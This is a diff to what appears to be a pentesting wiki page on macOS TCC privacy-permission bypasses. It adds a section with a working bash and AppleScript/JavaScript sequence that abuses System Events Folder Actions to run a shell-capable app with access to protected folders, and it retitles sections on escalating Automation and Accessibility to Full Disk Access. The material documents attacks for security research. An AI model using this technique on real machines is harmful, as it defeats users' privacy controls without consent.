@@ -350,7 +350,7 @@ INSERT INTO access (
 
 </details>
 
-### Automation to FDA\*
+### Automation (Finder) to FDA\*
 
 The TCC name of the Automation permission is: **`kTCCServiceAppleEvents`**\
 This specific TCC permission also indicates the **application that can be managed** inside the TCC database (so the permissions doesn't allow just to manage everything).
@@ -440,7 +440,52 @@ EOD
 
 Same happens with **Script Editor app,** it can control Finder, but using an AppleScript you cannot force it to execute a script.
 
-### Automation + Accessibility (**`kTCCServicePostEvent`)** to FDA\*
+### Automation (SE) to some TCC
+
+System Events can create Folder Actions, and Folder actions can access some TCC folders, so a script like the following one can be used to abuse this behavour:
+
+```bash
+# Create script to execute with the action
+cat > "/tmp/script.js" <<EOD
+var app = Application.currentApplication();
+app.includeStandardAdditions = true;
+app.doShellScript("/Applications/iTerm.app/Contents/MacOS/iTerm2");
+EOD
+
+osacompile -l JavaScript -o "$HOME/Library/Scripts/Folder Action Scripts/script.scpt" "/tmp/script.js"
+
+# Create folder action with System Events in "$HOME/Desktop"
+osascript <<EOD
+tell application "System Events"
+    -- Ensure Folder Actions are enabled
+    set folder actions enabled to true
+
+    -- Define the path to the folder and the script
+    set homeFolder to path to home folder as text
+    set folderPath to homeFolder & "Desktop"
+    set scriptPath to homeFolder & "Library:Scripts:Folder Action Scripts:script.scpt"
+
+    -- Create or get the Folder Action for the Desktop
+    if not (exists folder action folderPath) then
+        make new folder action at end of folder actions with properties {name:folderPath, path:folderPath}
+    end if
+    set myFolderAction to folder action folderPath
+
+    -- Attach the script to the Folder Action
+    if not (exists script scriptPath of myFolderAction) then
+        make new script at end of scripts of myFolderAction with properties {name:scriptPath, path:scriptPath}
+    end if
+
+    -- Enable the Folder Action and the script
+    enable myFolderAction
+end tell
+EOD
+
+# Open the folder, this won't be enough, but just getting out of it, or getting it is enough to trigger the folder action script
+open "$HOME/Desktop"
+```
+
+### Automation (SE) + Accessibility (**`kTCCServicePostEvent`)** to FDA\*
 
 Automation on **`System Events`** + Accessibility (**`kTCCServicePostEvent`**) allows to send **keystrokes to processes**. This way you could abuse Finder to change the users TCC.db or to give FDA to an arbitrary app (although password might be prompted for this).
 
